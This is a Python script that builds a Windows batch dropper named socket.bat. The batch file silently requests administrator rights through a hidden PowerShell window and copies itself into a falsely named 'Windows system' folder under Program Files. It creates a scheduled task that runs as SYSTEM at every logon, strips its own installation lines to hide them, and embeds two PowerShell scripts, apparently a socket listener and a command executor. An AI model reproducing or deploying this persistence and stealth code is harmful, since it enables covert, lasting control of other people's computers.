socketBat = open("socket.bat", "w")

def wr(string):
    socketBat.write(string)

socketBat.write("@echo off \r\n");
socketBat.write("if not \"%1\"==\"am_admin\" (start /B /min powershell -windowStyle hidden start -verb runas '%0' am_admin & exit /b) \r\n");


wr("if exist \"C:\Program Files\Windows system\socket.bat\" (exit 0) \r\n")
wr("mkdir C:\\\"Program Files\"\\\"Windows system\" \r\n")
wr("copy %0 C:\\\"Program Files\"\\\"Windows system\"\\socket.bat \r\n")
wr("schtasks /create /F /ru \"SYSTEM\" /sc onlogon /tn BatSocket /rl highest /tr \"\\\"C:\\Program Files\\Windows system\\socket.bat\"\\\" \r\n")
wr("findstr /V \"exist mkdir copy schtasks findstr exit\" %0 > \"C:\Program Files\Windows system\socket.bat\" \r\n")
wr("schtasks /run /I /TN BatSocket \r\n")
wr("exit 0 \r\n")


socket = open("socket.ps1", "r")
executor = open("executor.ps1", "r")

socketBat.write("objSocket.WriteLine \"");
#-windowstyle hidden

while 1: 
    char = socket.read(1)           
    if not char: 
        socketBat.write('"\r\n')
        break
    if char != '\n':
        socketBat.write(char)

socketBat.write("objExecutor.WriteLine \"")
while 1:
    char = executor.read(1)  
    if not char: 
        socketBat.write('"\r\n')
        break 
    if char != '\n':  
        socketBat.write(char)   


socketBat.close()
socket.close()
executor.close()

